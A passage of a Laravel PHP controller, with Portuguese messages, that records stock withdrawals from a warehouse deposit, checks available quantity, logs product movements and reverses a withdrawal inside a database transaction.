                $empresa_id
            );
            if (!$contexto) {
                session()->flash("flash_error", "Não foi possível identificar o depósito de estoque.");
                return redirect()->back();
            }

            $local_id = $contexto['local_id'];
            $deposito_id = $contexto['deposito_id'];

            // dd($request->all());
            $estoqueAtual = $this->findEstoqueByContext((int)$request->produto_id, $request->produto_variacao_id, $deposito_id, $local_id)
                ->select('estoques.*')
                ->first();

            if($estoqueAtual == null){
                session()->flash("flash_error", "Estoque não encontrado!");
                return redirect()->back();
            }

            if($estoqueAtual->quantidade < $request->quantidade){
                session()->flash("flash_error", "Estoque insuficiente!");
                return redirect()->back();
            }

            $retirada = RetiradaEstoque::create([
                'motivo' => $request->motivo,
                'observacao' => $request->observacao ?? '',
                'produto_id' => $request->produto_id,
                'empresa_id' => $empresa_id,
                'quantidade' => $request->quantidade,
                'local_id' => $local_id,
                'deposito_id' => $deposito_id
            ]);

            $this->util->reduzEstoque($request->produto_id, $request->quantidade, $request->produto_variacao_id, $local_id, $deposito_id);

            $transacao = $this->findEstoqueByContext((int)$request->produto_id, $request->produto_variacao_id, $deposito_id, $local_id)->first();
            if (!$transacao) {
                throw new \Exception("Não foi possível localizar a transação de estoque.");
            }
            $tipo = 'reducao';
            $codigo_transacao = $transacao->id;
            $tipo_transacao = 'alteracao_estoque';

            $this->util->movimentacaoProduto($request->produto_id, $request->quantidade, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $request->produto_variacao_id, $local_id, $deposito_id);

            session()->flash("flash_success", "Estoque retirado com sucesso!");
        }catch (\Exception $e) {
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->back();
    }

    public function retiradaDestroy($id){
        $item = RetiradaEstoque::findOrFail($id);
        try{
            DB::transaction(function () use ($item) {
                $contexto = $this->resolveDepositoContext($item->deposito_id, $item->local_id, $item->empresa_id);
                if (!$contexto) {
                    throw new \Exception("Não foi possível identificar o local para estornar a retirada.");
                }

                $local_id = $contexto['local_id'];
                $deposito_id = $contexto['deposito_id'];

                $this->util->incrementaEstoque($item->produto_id, $item->quantidade, $item->produto_variacao_id, $local_id, $deposito_id);

                $transacao = $this->findEstoqueByContext((int)$item->produto_id, $item->produto_variacao_id, $deposito_id, $local_id)->first();
                if (!$transacao) {
                    throw new \Exception("Não foi possível localizar a transação de estoque.");
                }
                $tipo = 'incremento';
                $codigo_transacao = $transacao->id;
                $tipo_transacao = 'alteracao_estoque';

                $this->util->movimentacaoProduto($item->produto_id, $item->quantidade, $tipo, $codigo_transacao, $tipo_transacao, \Auth::user()->id, $item->produto_variacao_id, $local_id, $deposito_id);

                $item->delete();
            });
            session()->flash("flash_success", "Registro removido com sucesso!");
        }catch (\Exception $e) {
            session()->flash("flash_error", "Algo deu errado: " . $e->getMessage());
        }
        return redirect()->back();
    }
}
